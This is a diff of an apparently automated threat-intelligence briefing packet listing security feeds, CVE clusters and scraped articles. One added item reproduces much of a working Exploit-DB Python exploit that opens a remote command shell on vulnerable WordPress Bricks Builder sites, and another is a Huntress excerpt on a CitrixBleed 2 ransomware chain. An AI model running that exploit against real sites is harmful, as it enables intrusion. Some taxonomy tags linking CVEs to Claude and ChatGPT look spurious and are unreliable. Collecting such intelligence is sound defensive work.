@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-10T18:39:02.701789+00:00
+- Generated: 2026-07-10T20:37:47.404952+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
 - Total items in window: 333
 - Total clusters raw: 139
-- Total clusters in packet: 56
-- Dropped low score: 83
+- Total clusters in packet: 57
+- Dropped low score: 82
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -75,6 +75,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Unit 42** (threat_research_primary)
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
@@ -90,11 +95,6 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
@@ -110,6 +110,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
@@ -120,26 +125,31 @@
   - Status: ok
   - Item count: 15
   - In window count: 3
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
   - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
-  - Status: ok
-  - Item count: 10
+  - Item count: 15
   - In window count: 2
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
   - Status: ok
-  - Item count: 15
+  - Item count: 10
   - In window count: 2
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 3
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
@@ -150,48 +160,43 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
-  - Status: ok
-  - Item count: 78
-  - In window count: 0
 - **Red Canary** (detection_response_operations)
   - URL: https://redcanary.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
-  - Item count: 50
-  - In window count: 3
-- **PortSwigger Research** (offensive_vulnerability_research)
-  - URL: https://portswigger.net/research/rss
-  - Status: ok
-  - Item count: 40
+  - Item count: 78
   - In window count: 0
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
   - Item count: 50
   - In window count: 19
-- **watchTowr Labs** (offensive_vulnerability_research)
-  - URL: https://labs.watchtowr.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 0
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **PortSwigger Research** (offensive_vulnerability_research)
+  - URL: https://portswigger.net/research/rss
+  - Status: ok
+  - Item count: 40
+  - In window count: 0
+- **watchTowr Labs** (offensive_vulnerability_research)
+  - URL: https://labs.watchtowr.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 0
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Active Countermeasures** (detection_response_operations)
+  - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -205,11 +210,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Active Countermeasures** (detection_response_operations)
-  - URL: https://www.activecountermeasures.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Sophos X-Ops** (detection_response_operations)
   - URL: https://news.sophos.com/en-us/category/threat-research/feed/
   - Status: ok
@@ -220,16 +220,16 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **SpecterOps** (detection_response_operations)
-  - URL: https://medium.com/feed/specter-ops-posts
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **SpecterOps** (detection_response_operations)
+  - URL: https://medium.com/feed/specter-ops-posts
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
@@ -245,11 +245,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 6
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 9
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
@@ -260,36 +255,36 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 9
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Sysdig** (detection_response_operations)
-  - URL: https://sysdig.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
+- **Sysdig** (detection_response_operations)
+  - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
-  - In window count: 4
+  - In window count: 1
 - **Cloudflare Security** (cloud_identity_infrastructure)
   - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
   - Item count: 20
   - In window count: 2
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 4
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
@@ -299,6 +294,21 @@
   - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
   - Status: ok
   - Item count: 20
+  - In window count: 0
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - URL: https://www.chainalysis.com/blog/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
@@ -310,21 +320,11 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Chainalysis** (ransomware_ecrime_financial_crime)
-  - URL: https://www.chainalysis.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
   - Item count: 5
   - In window count: 5
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **BleepingComputer** (cyber_news_breach_reporting)
   - URL: https://www.bleepingcomputer.com/feed/
   - Status: ok
@@ -340,6 +340,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 22
 - **CyberScoop** (cyber_news_breach_reporting)
   - URL: https://cyberscoop.com/feed/
   - Status: ok
@@ -350,16 +355,16 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 23
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
-  - In window count: 21
+  - In window count: 22
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
@@ -380,21 +385,6 @@
   - Status: ok
   - Item count: 10
   - In window count: 5
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 3
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
@@ -405,10 +395,25 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
   - Status: ok
   - Item count: 0
+  - In window count: 0
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
   - In window count: 0
 - **Reddit r/msp** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/msp/.rss
@@ -420,21 +425,16 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
   - Status: ok
-  - Item count: 100
-  - In window count: 0
+  - Item count: 20
+  - In window count: 3
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
@@ -518,13 +518,13 @@
   - https://www.darkreading.com/vulnerabilities-threats/citrixbleed-ing-again-netscaler-vulnerability-under-attack
   - https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
 
-### CVE-2026-48283 exploitation activity
-- Anchor signal: CVE-2026-48283
-- Theme key: cve-2026-48283
+### CVE-2026-48313 exploitation activity
+- Anchor signal: CVE-2026-48313
+- Theme key: cve-2026-48313
 - Cluster count: 2
 - Article count: 2
 - Cohesion: 0.281
-- Shared strong signals: CVE-2026-48283
+- Shared strong signals: CVE-2026-48313
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -535,13 +535,13 @@
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-9181/
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-48283-cve-2026-48313/
 
-### CVE-2026-48313 exploitation activity
-- Anchor signal: CVE-2026-48313
-- Theme key: cve-2026-48313
+### CVE-2026-48283 exploitation activity
+- Anchor signal: CVE-2026-48283
+- Theme key: cve-2026-48283
 - Cluster count: 2
 - Article count: 2
 - Cohesion: 0.281
-- Shared strong signals: CVE-2026-48313
+- Shared strong signals: CVE-2026-48283
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -699,13 +699,14 @@
 ### Leading edge (0)
 
 ### Convergence (15)
+- Pair: CVE-2024-25600 + WordPress (cluster 1d65faccbc, first observation: True)
+- Pair: CVE-2025-5777 + Anthropic/Claude (cluster aaaf47b0ea, first observation: True)
+- Pair: CVE-2025-5777 + OpenAI/ChatGPT (cluster aaaf47b0ea, first observation: True)
 - Pair: CVE-2026-12486 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-12488 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-25106 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-28739 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-33091 + Cisco (cluster 118be3a32e, first observation: True)
-- Pair: CVE-2025-5777 + Anthropic/Claude (cluster aaaf47b0ea, first observation: True)
-- Pair: CVE-2025-5777 + OpenAI/ChatGPT (cluster aaaf47b0ea, first observation: True)
 - Pair: CVE-2024-12356 + Anthropic/Claude (cluster 8b4ae517ee, first observation: True)
 - Pair: CVE-2024-12356 + Linux kernel (cluster 8b4ae517ee, first observation: True)
 - Pair: CVE-2024-12356 + OpenAI/ChatGPT (cluster 8b4ae517ee, first observation: True)
@@ -713,7 +714,6 @@
 - Pair: CVE-2026-40138 + Linux kernel (cluster 8b4ae517ee, first observation: True)
 - Pair: CVE-2026-40138 + OpenAI/ChatGPT (cluster 8b4ae517ee, first observation: True)
 - Pair: CVE-2026-40139 + Anthropic/Claude (cluster 8b4ae517ee, first observation: True)
-- Pair: CVE-2026-40139 + Linux kernel (cluster 8b4ae517ee, first observation: True)
 
 ### Drift (2)
 - **MuddyWater** (cluster 3ee1d54d9d)
@@ -721,16 +721,17 @@
   - New products: OpenAI/ChatGPT
   - Prior top industries: critical_infrastructure, financial_services, government
   - Prior top products: Android, Apple iOS/macOS, Ivanti
-- **BlackCat/ALPHV** (cluster 47aa07e166)
-  - New industries: government
+- **Scattered Spider** (cluster eaade871e6)
+  - New industries: critical_infrastructure, education
   - New products: (none)
-  - Prior top industries: financial_services, healthcare, legal_professional
-  - Prior top products: Citrix, Fortinet, Microsoft SharePoint
+  - Prior top industries: financial_services, government, healthcare
+  - Prior top products: AWS, Apple iOS/macOS, Microsoft SharePoint
 
-### Persistence (6)
+### Persistence (7)
 - cve_ids: CVE-2026-20230 (weeks observed: 5, cluster 8e87b71464)
 - cve_ids: CVE-2026-33825 (weeks observed: 5, cluster 8fa37afed0)
 - actor_attribution: MuddyWater (weeks observed: 4, cluster 3ee1d54d9d)
+- actor_attribution: Scattered Spider (weeks observed: 4, cluster eaade871e6)
 - cve_ids: CVE-2026-47729 (weeks observed: 3, cluster 8e87b71464)
 - cve_ids: CVE-2025-5777 (weeks observed: 3, cluster aaaf47b0ea)
 - cve_ids: CVE-2026-50656 (weeks observed: 3, cluster 8fa37afed0)
@@ -881,18 +882,22 @@ CVE-2026-9181 Esri ArcGIS Server Pre-Authentication Path Traversal Vulnerability
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-07-07T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52619
-- Fetch status: fetch_failed:HTTPError
+- Fetch status: ok
 - Member count: 2
 - Corroborating source count: 2
 - Strong signals: WordPress
 
 #### Cluster taxonomy (union across members)
 - affected_products: WordPress
+- cve_ids: CVE-2024-25600
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research, tier_4_news
 
 #### Primary article taxonomy
 - affected_products: WordPress
+- cve_ids: CVE-2024-25600
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -900,6 +905,12 @@ CVE-2026-9181 Esri ArcGIS Server Pre-Authentication Path Traversal Vulnerability
 
 ```
 WordPress Bricks Builder Theme - RCE
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WordPress Bricks Builder Theme - RCE EDB-ID: 52619 CVE: 2024-25600 EDB Verified: Author: Jared Brits Type: webapps Exploit: / Platform: Multiple Date: 2026-07-07 Vulnerable App: # Exploit Title: WordPress Bricks Builder Theme - RCE # Date: 2026-06-25 # Exploit Author: Jared Brits (K3ysTr0K3R) # Vendor Homepage: https://bricksbuilder.io/ # Software Link: https://bricksbuilder.io/ # Version: Bricks Builder <= 1.9.6 # Tested On: Kali Linux 2026.1 / WordPress 6.7 # CVE: CVE-2024-25600 # Description: Unauthenticated RCE vulnerability in Bricks Builder theme's # render_element endpoint. Extracts nonce from page source and # executes arbitrary commands on vulnerable WordPress installations. import re import requests import argparse import threading from bs4 import BeautifulSoup from rich.console import Console from prompt_toolkit import PromptSession, HTML from prompt_toolkit.history import InMemoryHistory from prompt_toolkit.auto_suggest import AutoSuggestFromHistory from concurrent.futures import ThreadPoolExecutor, as_completed from alive_progress import alive_bar color = Console() def ascii_art(): color.print("""[yellow] _______ ________ ___ ____ ___ __ __ ___ ___________ ____ ____ / ____/ | / / ____/ |__ \ / __ \__ \/ // / |__ \ / ____/ ___// __ \/ __ \\ / / | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / / / /___ | |/ / /__/_____/ __// /_/ / __/__ __/_____/ __/____/ / /_/ / /_/ / /_/ / \____/ |___/_____/ /____/\____/____/ /_/ /____/_____/\____/\____/\____/ [/yellow]""", style="bold") print("Coded By: Jared Brits (K3ysTr0K3R) --> Hello, Friend!") print("") headers = { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36" } paths = [ "/wp-json/bricks/v1/render_element", "/?rest_route=/bricks/v1/render_element" ] requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) def fetch_nonce(target): try: response = requests.get(target, verify=False, timeout=10) response.raise_for_status() soup = BeautifulSoup(response.text, "html.parser") script_tag = soup.find("script", id="bricks-scripts-js-extra") if script_tag: match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string) if match: nonce = match.group(1) return nonce except Exception: return None def interactive_shell(target, nonce): color.print("[bold bright_green][+][/bold bright_green] Interactive shell opened successfully") session = PromptSession(history=InMemoryHistory()) for vulnerable_path in paths: while True: try: command = session.prompt( HTML("<ansired><b>Shell> </b></ansired>"), auto_suggest=AutoSuggestFromHistory(), ) if command.lower() == "exit": return vulnerable_data = create_vulnerable_data(nonce, command) response = requests.post(target + vulnerable_path, headers=headers, json=vulnerable_data, verify=False, timeout=10) output = response.json().get('data').get('html') cleaned_output = output.replace("Exception: ", "") print(cleaned_output) except KeyboardInterrupt: return def create_vulnerable_data(nonce, command): return { "postId": "1", "nonce": nonce, "element": { "name": "code", "settings": { "executeCode": "true", "code": f"<?php throw new Exception(`{command}`);?>" } } } def exploit(target): nonce = fetch_nonce(target) if nonce: elements = [create_element(nonce) for _ in range(4)] for path, element in zip(paths, elements): if exploit_successful(target, path, element): interactive_shell(target, nonce) break def exploit_successful(target, path, element): color.print("[bold bright_blue][*][/bold bright_blue] Checking if the target is vulnerable") try: response = requests.post(target + path, headers=headers, json=element, verify=False, timeout=10) response.raise_for_status() if response.status_code == 200 and 'KHABuhwxnUHDDW' in response.text: color.print("[bold brig
 ```
 
 #### Corroborating sources (2)
@@ -962,7 +973,54 @@ CVE-2026-48283 / CVE-2026-48313 Adobe ColdFusion Pre-Authentication Unrestricted
   - Link: https://horizon3.ai/attack-research/vulnerabilities/cve-2026-48283-cve-2026-48313/
   - Summary: CVE-2026-48283 / CVE-2026-48313: Adobe ColdFusion Pre-Authentication Unrestricted File Upload and Path Traversal Vulnerabilities
 
-### Cluster 118be3a32e — score 17
+### Cluster aaaf47b0ea — score 16
+
+- Title: CitrixBleed 2 (CVE-2025-5777) 7Steps to Dragonforce Ransomware | Huntress
+- Source: Huntress (detection_response_operations)
+- Published: 2026-07-09T14:00:00+00:00
+- Link: https://www.huntress.com/blog/citrixbleed-2-dragonforce-ransomware
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2025-5777
+
+#### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng, ransomware_extortion, web_shell_backdoor
+- affected_products: Anthropic/Claude, Citrix, OpenAI/ChatGPT
+- cve_ids: CVE-2025-5777
+- urgency_signals: preauth_unauth
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, web_shell_backdoor
+- affected_products: Citrix, Anthropic/Claude, OpenAI/ChatGPT
+- cve_ids: CVE-2025-5777
+- urgency_signals: preauth_unauth
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Huntress has observed a series of strikingly similar intrusions beginning with CitrixBleed 2 exploitation, employing novel local privilege escalation techniques, and ending in Dragonforce ransomware.
+```
+
+#### Full body
+
+```
+Home Blog Seven Steps to Ransomware: CitrixBleed 2 Weaponized by Initial Access Brokers Published: July 9, 2026 Seven Steps to Ransomware: CitrixBleed 2 Weaponized by Initial Access Brokers By: Michael Tigges Anna Pham Anton Ovrutsky Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress investigated a half-dozen intrusions across unrelated organizations in the first half of 2026 and found the same repeatable seven-step attack chain, suggesting a highly standardized operator playbook rather than one-off compromises. The intrusions began with exploitation of CitrixBleed 2 (CVE-2025-5777), where malformed pre-auth login requests leaked NetScaler memory and enabled attackers to steal and replay valid session tokens, making MFA effectively irrelevant once a live session was hijacked. After gaining access, the attacker followed a consistent post-compromise pattern: escalate to SYSTEM through a registry-symlink/AppMgmt privilege-escalation trick, create rogue local admin accounts, and establish persistence with legitimate remote access tools like ScreenConnect and Zoho Assist. In the most advanced case, the operation ended with DragonForce ransomware deployment, which is why the blog's main takeaway is urgent action: patch exposed NetScaler appliances, retain and review logs, terminate outstanding sessions, and audit for suspicious accounts and remote-management tooling. A special thanks to the Huntress Security Operations Center (SOC) personnel, for without them we'd be describing the below incidents with far more painful details– and Lindsey Welch, who tirelessly proofreads our content on a moment's notice. Additionally, this blog was authored with AI assistance. Introduction Across the first half of 2026, the Huntress Tactical Response unit worked a string of intrusions that all rhymed: an edge Citrix NetScaler gateway, sudden anomalous access to the environment, a tidy privilege-escalation, a fake "Citrix" administrator account, off-the-shelf remote-access software, and when the operator got what they wanted—Dragonforce ransomware. Huntress assesses with high confidence that an Initial Access Broker (IAB) is weaponizing CVE-2025-5777 (CitrixBleed 2) to gain access to Citrix environments, ultimately with the goal of deploying ransomware. In our observations, the ransomware deployed was Dragonforce, but public and private reporting finds indicators of other ransomware groups using this cluster as well, which forms the basis of our Initial Access Broker assessment. Background If you've investigated cybersecurity incidents for long enough, you know that most intrusions look a little different from one another. You learn to live with ambiguity: an RMM here, a phishing lure there, a webshell on a forgotten IIS box. Every so often, though, you work two cases back-to-back and feel a prickle of recognition—the same odd command line, the same throwaway account name, the same misconfiguration the attacker leaned on. Then you work a third. And a fourth. That is what happened with the cluster we're calling, internally and unimaginatively, the Citrix NetScaler cluster . In the first half of 2026 (between January and June) we responded to a half-dozen incidents at unrelated organizations—different industries, different managed service providers, different parts of the country—that were so mechanically similar that by the latest case we could predict the next artifact before we pulled the log that contained it. We knew the account name the operator would create. We knew the service they'd abuse. We even knew the workstation name we'd find leaking through a printer mapping, because it was the same workstation name every single time. Figure 1: Predictability and clustered behavior often presents the smoking gun for initial access. Cybersecurity company Sophos has additionally tracked the cluster we've observed as STAC3725 , echoing various analyses that we've presented in this article, and serves as an excellent va
+```
+
+#### Corroborating sources (1)
+
+- **Huntress** (detection_response_operations)
+  - Title: CitrixBleed 2 (CVE-2025-5777) 7Steps to Dragonforce Ransomware | Huntress
+  - Published: 2026-07-09T14:00:00+00:00
+  - Link: https://www.huntress.com/blog/citrixbleed-2-dragonforce-ransomware
+  - Summary: Huntress has observed a series of strikingly similar intrusions beginning with CitrixBleed 2 exploitation, employing novel local privilege escalation techniques, and ending in Dragonforce ransomware.
+
+### Cluster 118be3a32e — score 16
 
 - Title: WolfSSL, GeoVision, VTK vulnerabilities
 - Source: Cisco Talos (threat_research_primary)
@@ -1013,53 +1071,6 @@ WolfSSL, GeoVision, VTK vulnerabilities By Kri Dontje Thursday, July 9, 2026 14:
   - Published: 2026-07-08T14:30:00+00:00
   - Link: https://www.infosecurity-magazine.com/news/uat-7810-china-apt-orb-proxy/
   - Summary: Cisco Talos said China-linked APT UAT-7810 is growing its proxy relay network with new malware
-
-### Cluster aaaf47b0ea — score 16
-
-- Title: CitrixBleed 2 (CVE-2025-5777) 7Steps to Dragonforce Ransomware | Huntress
-- Source: Huntress (detection_response_operations)
-- Published: 2026-07-09T14:00:00+00:00
-- Link: https://www.huntress.com/blog/citrixbleed-2-dragonforce-ransomware
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: CVE-2025-5777
-
-#### Cluster taxonomy (union across members)
-- threat_categories: phishing_social_eng, ransomware_extortion, web_shell_backdoor
-- affected_products: Anthropic/Claude, Citrix, OpenAI/ChatGPT
-- cve_ids: CVE-2025-5777
-- urgency_signals: preauth_unauth
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, web_shell_backdoor
-- affected_products: Citrix, Anthropic/Claude, OpenAI/ChatGPT
-- cve_ids: CVE-2025-5777
-- urgency_signals: preauth_unauth
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Huntress has observed a series of strikingly similar intrusions beginning with CitrixBleed 2 exploitation, employing novel local privilege escalation techniques, and ending in Dragonforce ransomware.
-```
-
-#### Full body
-
-```
-Home Blog Seven Steps to Ransomware: CitrixBleed 2 Weaponized by Initial Access Brokers Published: July 9, 2026 Seven Steps to Ransomware: CitrixBleed 2 Weaponized by Initial Access Brokers By: Michael Tigges Anna Pham Anton Ovrutsky Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways Huntress investigated a half-dozen intrusions across unrelated organizations in the first half of 2026 and found the same repeatable seven-step attack chain, suggesting a highly standardized operator playbook rather than one-off compromises. The intrusions began with exploitation of CitrixBleed 2 (CVE-2025-5777), where malformed pre-auth login requests leaked NetScaler memory and enabled attackers to steal and replay valid session tokens, making MFA effectively irrelevant once a live session was hijacked. After gaining access, the attacker followed a consistent post-compromise pattern: escalate to SYSTEM through a registry-symlink/AppMgmt privilege-escalation trick, create rogue local admin accounts, and establish persistence with legitimate remote access tools like ScreenConnect and Zoho Assist. In the most advanced case, the operation ended with DragonForce ransomware deployment, which is why the blog's main takeaway is urgent action: patch exposed NetScaler appliances, retain and review logs, terminate outstanding sessions, and audit for suspicious accounts and remote-management tooling. A special thanks to the Huntress Security Operations Center (SOC) personnel, for without them we'd be describing the below incidents with far more painful details– and Lindsey Welch, who tirelessly proofreads our content on a moment's notice. Additionally, this blog was authored with AI assistance. Introduction Across the first half of 2026, the Huntress Tactical Response unit worked a string of intrusions that all rhymed: an edge Citrix NetScaler gateway, sudden anomalous access to the environment, a tidy privilege-escalation, a fake "Citrix" administrator account, off-the-shelf remote-access software, and when the operator got what they wanted—Dragonforce ransomware. Huntress assesses with high confidence that an Initial Access Broker (IAB) is weaponizing CVE-2025-5777 (CitrixBleed 2) to gain access to Citrix environments, ultimately with the goal of deploying ransomware. In our observations, the ransomware deployed was Dragonforce, but public and private reporting finds indicators of other ransomware groups using this cluster as well, which forms the basis of our Initial Access Broker assessment. Background If you've investigated cybersecurity incidents for long enough, you know that most intrusions look a little different from one another. You learn to live with ambiguity: an RMM here, a phishing lure there, a webshell on a forgotten IIS box. Every so often, though, you work two cases back-to-back and feel a prickle of recognition—the same odd command line, the same throwaway account name, the same misconfiguration the attacker leaned on. Then you work a third. And a fourth. That is what happened with the cluster we're calling, internally and unimaginatively, the Citrix NetScaler cluster . In the first half of 2026 (between January and June) we responded to a half-dozen incidents at unrelated organizations—different industries, 